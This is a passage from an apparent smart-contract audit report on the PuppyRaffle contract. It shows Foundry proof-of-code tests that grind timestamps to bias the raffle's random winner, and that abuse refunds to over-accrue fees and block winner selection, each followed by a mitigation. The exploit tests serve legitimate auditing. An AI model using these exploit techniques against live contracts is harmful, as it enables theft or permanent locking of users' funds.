            try grinder.trySelectLegendary(raffle, attacker) {
                succeeded = true;
                break;
            } catch {
                vm.warp(block.timestamp + 1); // also vary timestamp for winner RNG
            }
        }
        assertTrue(succeeded, "failed to grind desired outcome");
        assertEq(raffle.previousWinner(), attacker);
        assertEq(raffle.tokenIdToRarity(0), raffle.LEGENDARY_RARITY());
    }
}


## Suggested Mitigation
- Do not derive randomness from caller-controlled inputs like msg.sender or manipulable/unknowable-at-call-time fields (block.timestamp, block.difficulty/prevrandao).
- Use a verifiable randomness source (e.g., Chainlink VRF) for both winner selection and rarity.
- If avoiding oracles, use a two-step commit-reveal or future-block commit: store a seed at round close, then finalize using blockhash of a future block, ensuring the caller of finalize() cannot bias outcomes.
- Decouple the RNG trigger from the beneficiary; do not condition RNG on msg.sender.





 **Derived From** : Payouts/fees computed from players.length ignore refunded slots

## [H-8]. Fees over-accrued and permanently unwithdrawable when prize/fee use players.length instead of active pot

## Derived From Pattern/Invariant
Payouts/fees computed from players.length ignore refunded slots

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
## Minimim Privilege Required
Permissionless

## Description
selectWinner() computes totalAmountCollected = players.length * entranceFee even though refunded players are zeroed and their ETH is returned. This inflates prizePool and fee versus the actual pot (sum of non-zero entries). If ≤20% of entries are refunded, the prize transfer still succeeds, but totalFees is incremented by 20% of players.length while the contract balance only holds 20% of the active pot. The post-round invariant address(this).balance == totalFees is broken by exactly entranceFee * (#refunded), permanently bricking withdrawFees() and stranding protocol fees. Vulnerable snippet:

uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
address winner = players[winnerIndex];
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
... winner.call{value: prizePool}("");

## Impact
Protocol fees become over-accrued vs. real balance and can never be withdrawn; withdrawFees() reverts forever. Economic loss: fee revenue locked in contract permanently.

## Proof of Concept
- Attacker coordinates N unique addresses to enter once (N >= 5), paying N * entranceFee.
- Before selectWinner(), attacker refunds exactly floor(0.2 * N) of their slots to create holes but keep A >= 0.8N so prize transfer succeeds.
- Call selectWinner(); contract pays prize computed from N, accrues fees computed from N, but only A tickets remain funded. The remaining balance is A - 0.8N while totalFees increases by 0.2N, creating a deficit of entranceFee * (N - A).
- withdrawFees() now permanently fails (address(this).balance != totalFees).

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract AccountingInvariantViolationTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address constant FEE_ADDR = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, FEE_ADDR, 1 days);
    }

    function test_overAccrueFees_bricksWithdrawFees() public {
        // Arrange: 5 players enter
        address payer = address(0xBEEF);
        vm.deal(payer, 10 ether);
        address[] memory ps = new address[](5);
        ps[0] = address(0x1);
        ps[1] = address(0x2);
        ps[2] = address(0x3);
        ps[3] = address(0x4);
        ps[4] = address(0x5);
        vm.prank(payer);
        raffle.enterRaffle{value: 5 ether}(ps);

        // One player refunds (exactly 20%) so prize can still be paid
        vm.prank(ps[2]);
        raffle.refund(2);

        // Fast-forward to end of raffle
        vm.warp(block.timestamp + 1 days + 1);

        // Pick a timestamp so winnerIndex != 2 (the refunded hole) to avoid mint-to-zero revert
        address attacker = address(0xA11CE);
        uint256 ts = block.timestamp;
        uint256 d = block.difficulty;
        while (true) {
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, ts, d))) % 5;
            if (idx != 2) break;
            ts++;
        }
        vm.warp(ts);

        // Act: select winner (should succeed)
        vm.prank(attacker);
        raffle.selectWinner();

        // Assert: totalFees > contract balance and withdrawFees is bricked
        assertGt(uint256(raffle.totalFees()), address(raffle).balance, "fees over-accrued vs real balance");
        vm.expectRevert(bytes("PuppyRaffle: There are currently players active!"));
        raffle.withdrawFees();
    }
}


## Suggested Mitigation
- Compute the pot from actual funds, not players.length. Use pot = address(this).balance - totalFees before accruing current-round fees.
- Then set prize = pot * 80% and fee = pot - prize; accrue totalFees += fee.
- Additionally, select winner among active players only (skip address(0) entries) so holes don’t affect RNG or accounting.


## [M-9]. Refund-induced holes make selectWinner try to pay more than balance, causing round-wide DoS

## Derived From Pattern/Invariant
Payouts/fees computed from players.length ignore refunded slots

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
## Minimim Privilege Required
Permissionless

## Description
Because prizePool is derived from players.length * entranceFee while refunded slots have already withdrawn their ETH, selectWinner() may attempt to transfer more ETH than the contract holds when refunded > 20% of entries. The low-level call with excessive value reverts, bricking winner selection until new deposits top up the pot.

## Impact
selectWinner() will revert when more than 20% of entries are refunded because prize/fee are computed from players.length instead of the actual pot, causing the transfer to attempt sending more ETH than the contract holds. This stalls the round until additional ETH is deposited or remaining participants refund out. No direct loss of funds occurs (participants can still self-refund), but protocol liveness is impacted and fee withdrawal is delayed.

## Proof of Concept
- N=5 unique addresses enter (5 * entranceFee deposited).
- 2 addresses refund (A=3 alive < 0.8*N=4), creating holes and withdrawing 2 * entranceFee.
- After duration elapses, calling selectWinner() tries to pay prize=4*entranceFee while balance is 3*entranceFee. The value transfer reverts, blocking the round.

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract DoSSelectWinnerTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(0xFEE), 1 days);
    }

    function test_selectWinner_reverts_whenRefundsExceedTwentyPercent() public {
        // Arrange: 5 players enter
        address payer = address(0xBEEF);
        vm.deal(payer, 10 ether);
        address[] memory ps = new address[](5);
        ps[0] = address(0x1);
        ps[1] = address(0x2);
        ps[2] = address(0x3);
        ps[3] = address(0x4);
        ps[4] = address(0x5);
        vm.prank(payer);
        raffle.enterRaffle{value: 5 ether}(ps);
        // 2 refunds => A=3, N=5
        vm.prank(ps[2]);
        raffle.refund(2);
        vm.prank(ps[3]);
        raffle.refund(3);
        // End raffle
        vm.warp(block.timestamp + 1 days + 1);
        // Act & Assert: selectWinner reverts due to insufficient balance for prize
        vm.expectRevert();
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Compute payouts from the real pot and exclude previously accrued fees: pot = address(this).balance - totalFees; require(pot > 0); prize = (pot * 80) / 100; fee = pot - prize; totalFees += fee. Additionally, track an activeCount (or maintain a compact active list) and derive the winner index from active players only. Revert if activeCount < 4 or if the selected winner would be address(0). This removes holes from payout math and prevents selecting a zero-address winner.



